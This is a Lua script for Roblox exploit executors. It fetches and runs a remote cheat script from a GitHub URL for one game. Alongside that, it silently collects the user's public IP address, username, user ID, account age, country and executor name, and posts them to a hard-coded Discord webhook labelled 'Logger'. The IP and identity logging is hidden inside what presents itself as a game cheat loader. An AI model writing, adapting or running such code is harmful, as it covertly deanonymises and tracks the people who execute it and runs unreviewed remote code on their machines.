local Players = game:GetService('Players');
local Player = Players.LocalPlayer;
local Localization = game:GetService("LocalizationService");

function SendWebhook()
	local ExecutedIP = tostring(game:HttpGet("https://api.ipify.org", true))
	local OSTime = os.time()
	local Time = os.date('!*t', OSTime)
	local Embed = {
		["title"] = "__**New execution.**__",
		["description"] = "Name: "..Player.Name.."\nDisplay Name: "..Player.DisplayName.."\nExploit: "..identifyexecutor().."\nGame: https://www.roblox.com/games/"..game.PlaceId,
		["type"] = "rich",
		["color"] = tonumber(0xffff00),
		["thumbnail"] = {
			["url"] = "https://www.roblox.com/asset-thumbnail/image?assetId="..game.PlaceId.."&width=768&height=432"
		},
		["image"] = {
			["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=250&y=250&Format=Png&username="..Player.Name
		},
		["fields"] = {
			{
				["name"] = "__Account Age:__",
				["value"] = Player.AccountAge.." days old",
				["inline"] = true
			},
			{
				["name"] = "__User ID:__",
				["value"] = Player.UserId,
				["inline"] = true
			},
			{
				["name"] = "__IP:__",
				["value"] = ExecutedIP,
				["inline"] = true
			},
			{
				["name"] = "__Country:__",
				["value"] = Localization:GetCountryRegionForPlayerAsync(Player),
				["inline"] = true
			},
		},
		["footer"] = {
			["text"] = 'Logger',
			["icon_url"] = "https://cdn.discordapp.com/attachments/959947675900461096/1042254064655794187/unknown.png"
		},
		["timestamp"] = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec),
	};
	(syn and syn.request or http_request or http.request) {
		Url = 'https://discord.com/api/webhooks/1049206698872668222/AiNR5sSg5cxd6m5wXEIinUShRzTX5gz1ISiyqhm5zMWSFJ9iebppEIITfF-ArywLQEV7';
		Method = 'POST';
		Headers = {
			['Content-Type'] = 'application/json';
		};
		Body = game:GetService'HttpService':JSONEncode({content = Content; embeds = {Embed}; });
	};
end

if game.PlaceId == 1186465433 then
	loadstring(game:HttpGet("https://raw.githubusercontent.com/xXxBanisherxXx/Scripts/main/DBXL.lua"))()
else
	print('Game no found')
end

SendWebhook()
